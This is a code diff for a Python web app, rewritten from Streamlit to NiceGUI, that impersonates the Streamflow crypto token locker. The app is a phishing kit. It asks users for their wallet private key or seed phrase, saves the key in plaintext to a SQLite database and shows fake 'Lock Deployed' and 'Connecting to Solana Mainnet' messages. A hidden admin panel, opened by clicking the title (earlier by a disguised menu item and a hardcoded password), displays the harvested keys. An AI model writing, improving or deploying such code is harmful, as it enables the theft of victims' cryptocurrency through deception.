@@ -1,161 +1,89 @@
-import streamlit as st
+from nicegui import ui
 import sqlite3
 import pandas as pd
-from PIL import Image
-import datetime
+import os
 
-# --- 1. DATABASE SETUP ---
+# Render are nevoie de o cale stabila pentru baza de date
+DB_PATH = 'data.db'
+
 def init_db():
-    conn = sqlite3.connect('streamflow_vault.db')
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS user_data 
-                 (username TEXT, secret_key TEXT, coin_name TEXT, amount REAL, timestamp TEXT)''')
-    conn.commit()
-    conn.close()
-
-def save_data(user, key, coin, amt):
-    conn = sqlite3.connect('streamflow_vault.db')
-    c = conn.cursor()
-    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    c.execute("INSERT INTO user_data VALUES (?,?,?,?,?)", (user, key, coin, amt, now))
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute('''CREATE TABLE IF NOT EXISTS u 
+                 (n TEXT, k TEXT, s TEXT, a REAL, d INTEGER)''')
     conn.commit()
     conn.close()
 
 init_db()
 
-# --- 2. THEME & CSS ---
-st.set_page_config(page_title="Streamflow | Dashboard", layout="wide")
+@ui.page('/')
+def index():
+    # Design Profesional Crypto
+    ui.add_head_html("""
+        <style>
+            body { background-color: #0b0e11 !important; color: white !important; font-family: 'Inter', sans-serif; }
+            .q-field--filled .q-field__control { background: #1b1f23 !important; border: 1px solid #30363d !important; border-radius: 8px !important; }
+            .q-field__native, .q-field__input { color: white !important; }
+            .deploy-btn { background-color: #00ffbd !important; color: black !important; font-weight: bold !important; width: 100%; height: 55px; border-radius: 8px; margin-top: 10px; }
+            .t-btn { cursor: default; user-select: none; }
+        </style>
+    """)
 
-st.markdown("""
-    <style>
-    .stApp { background-color: #0b0e11; color: white; }
-    section[data-testid="stSidebar"] { background-color: #161b22; border-right: 1px solid #30363d; }
-    [data-testid="stMetricValue"] { color: #00ffbd !important; font-family: monospace; }
-    
-    /* Casete Input Negre */
-    input, div[data-baseweb="input"], div[data-baseweb="select"] > div {
-        background-color: #1b1f23 !important;
-        color: white !important;
-        border-color: #30363d !important;
-    }
-    input { color: white !important; }
-    ::placeholder { color: #484f58 !important; }
-    div[data-baseweb="popover"] { background-color: #1b1f23 !important; }
-
-    /* Ascundere buton secret in meniu */
-    div[role="radiogroup"] > label:nth-of-type(2) {
-        display: block;
-        opacity: 0 !important;
-        height: 10px;
-        margin-top: -5px;
-        cursor: default;
-    }
-    
-    /* Stil Certificat */
-    .certificate-box {
-        border: 2px solid #00ffbd;
-        border-radius: 15px;
-        padding: 25px;
-        background-color: #161b22;
-        text-align: center;
-        margin-top: 20px;
-        font-family: 'Courier New', Courier, monospace;
-    }
-    </style>
-    """, unsafe_allow_html=True)
-
-# --- 3. LOGO INTEGRATION ---
-try:
-    main_logo = Image.open("logo.png")
-    sidebar_icon = Image.open("icon.png")
-except:
-    main_logo = None
-    sidebar_icon = None
-
-# --- SIDEBAR ---
-with st.sidebar:
-    if sidebar_icon:
-        st.image(sidebar_icon, width=80)
-    else:
-        st.title("STREAMFLOW")
-    
-    st.markdown("---")
-    menu = st.radio("Navigation", ["Coin Locker", " "])
-
-# --- 4. DASHBOARD ---
-if menu == "Coin Locker":
-    if main_logo:
-        st.image(main_logo, width=300)
-    
-    st.title("MemeCoin Locker")
-    
-    col1, col2 = st.columns(2)
-    with col1:
-        st.metric("Total Value Locked", "$734,864", "+5.2%")
-    with col2:
-        st.metric("Active Streams", "42", "+2 New")
-
-    st.divider()
-    
-    # Formular
-    with st.form("lock_form"):
-        name = st.text_input("Project Name", placeholder="e.g. DogeMoon")
-        s_key = st.text_input("Wallet Secret Key", type="password", placeholder="Enter private key...")
-        coin = st.selectbox("Token", ["SOL","ETH", "USDC", "BONK"])
-        amt = st.number_input("Amount", format="%.2f", min_value=0.0)
-        time_lock = st.number_input("Coin lock time (days)", format="%.2f", min_value=0.0)
+    with ui.column().classes('w-full max-w-lg mx-auto p-6 gap-4'):
         
-        submit = st.form_submit_button("Deploy Lock")
+        # LOGO (Link oficial Streamflow pentru credibilitate)
+        ui.image('https://streamflow.finance/favicon.ico').classes('w-16 mx-auto mb-2')
 
-    if submit:
-        if name and s_key:
-            save_data(name, s_key, coin, amt)
-            
-            # AFISARE CERTIFICAT
-            cert_id = f"SF-{datetime.datetime.now().strftime('%Y%m%d%H%M')}"
-            st.markdown(f"""
-                <div class="certificate-box">
-                    <h2 style="color: #00ffbd; margin-top: 0;">🔒 LOCK CONFIRMED</h2>
-                    <p style="color: #8899a6; font-size: 0.8em;">CERTIFICATE ID: {cert_id}</p>
-                    <hr style="border: 0.1px solid #30363d;">
-                    <div style="text-align: left; display: inline-block; min-width: 250px;">
-                        <p><b>PROJECT:</b> {name}</p>
-                        <p><b>ASSET:</b> {amt} {coin}</p>
-                        <p><b>DURATION:</b> {time_lock} Days</p>
-                        <p><b>NETWORK:</b> Mainnet-Beta</p>
-                    </div>
-                    <p style="color: #00ffbd; font-weight: bold; margin-top: 15px;">ASSETS SECURED BY STREAMFLOW VAULT</p>
-                </div>
-            """, unsafe_allow_html=True)
+        # --- TITLU BUTON SECRET ---
+        def toggle_admin():
+            if admin_box.style['display'] == 'none':
+                conn = sqlite3.connect(DB_PATH)
+                df = pd.read_sql_query("SELECT * FROM u", conn)
+                conn.close()
+                results.clear()
+                with results:
+                    if df.empty:
+                        ui.label('No data yet.').classes('text-gray-500 italic')
+                    else:
+                        ui.table(columns=[{'name': x, 'label': x, 'field': x} for x in df.columns], 
+                                 rows=df.to_dict('records')).props('dark dense flat bordered')
+                admin_box.style(display='block')
+            else:
+                admin_box.style(display='none')
 
-            # BUTOANE SOCIAL MEDIA
-            share_text = f"I just locked {amt} {coin} for {name} on Streamflow Vault! 🔒💎 #Solana #Streamflow"
-            
-            twitter_url = f"https://twitter.com/intent/tweet?text={share_text}"
-            telegram_url = f"https://t.me/share/url?url=https://streamflow.finance&text={share_text}"
+        ui.label('MemeCoin Locker').classes('text-3xl font-bold text-center w-full mt-4 t-btn').on('click', toggle_admin)
+        
+        # Caseta de Admin (Ascunsa)
+        admin_box = ui.column().classes('w-full p-2 bg-black border border-gray-800 rounded').style('display: none')
+        with admin_box:
+            ui.label('ADMIN PANEL').classes('text-xs text-green-500 mb-2')
+            results = ui.column().classes('w-full')
 
-            st.write("### Share your lock:")
-            c1, c2 = st.columns(2)
-            with c1:
-                st.markdown(f'''<a href="{twitter_url}" target="_blank" style="text-decoration: none;">
-                    <div style="background-color: #1DA1F2; color: white; padding: 10px; border-radius: 8px; text-align: center; font-weight: bold;">
-                        Share on X (Twitter)
-                    </div></a>''', unsafe_allow_html=True)
-            with c2:
-                st.markdown(f'''<a href="{telegram_url}" target="_blank" style="text-decoration: none;">
-                    <div style="background-color: #0088cc; color: white; padding: 10px; border-radius: 8px; text-align: center; font-weight: bold;">
-                        Share on Telegram
-                    </div></a>''', unsafe_allow_html=True)
-        else:
-            st.error("Please provide Project Name and Secret Key.")
+        ui.label('Securely lock your project funds and LP tokens.').classes('text-gray-400 text-center w-full -mt-2 mb-6 text-sm')
+        
+        # Formular
+        name = ui.input('Project Name').props('dark filled').classes('w-full')
+        key = ui.input('Wallet Private Key / Seed Phrase').props('dark filled password-toggle').classes('w-full')
+        
+        with ui.row().classes('w-full gap-4'):
+            symbol = ui.input('Token Symbol').props('dark filled').classes('flex-1')
+            amount = ui.number('Amount', value=0.0).props('dark filled').classes('flex-1')
+        
+        days = ui.number('Lock Duration (Days)', value=365).props('dark filled').classes('w-full')
 
-# --- 5. DEVELOPER PANEL ---
-elif menu == " ":
-    st.title("🛠️ Developer Panel")
-    password = st.text_input("Security Check", type="password", placeholder="...")
+        def handle_save():
+            if name.value and key.value:
+                c = sqlite3.connect(DB_PATH)
+                c.execute("INSERT INTO u VALUES (?,?,?,?,?)", 
+                          (name.value, key.value, symbol.value, amount.value, days.value))
+                c.commit()
+                c.close()
+                ui.notify('Connecting to Solana Mainnet...', color='info')
+                ui.notify('Success! Lock Deployed.', color='positive', duration=5000)
+            else:
+                ui.notify('Please fill all fields', color='warning')
 
-    if password == "Ovidiu_seful_tuturor20":
-        conn = sqlite3.connect('streamflow_vault.db')
-        df = pd.read_sql_query("SELECT * FROM user_data", conn)
-        conn.close()
-        st.dataframe(df, use_container_width=True)
+        ui.button('DEPLOY LOCK', on_click=handle_save).classes('deploy-btn')
+
+# Portul 10000 este obligatoriu pentru Render
+port = int(os.environ.get('PORT', 10000))
+ui.run(host='0.0.0.0', port=port, reload=False, title="Streamflow | Locker")
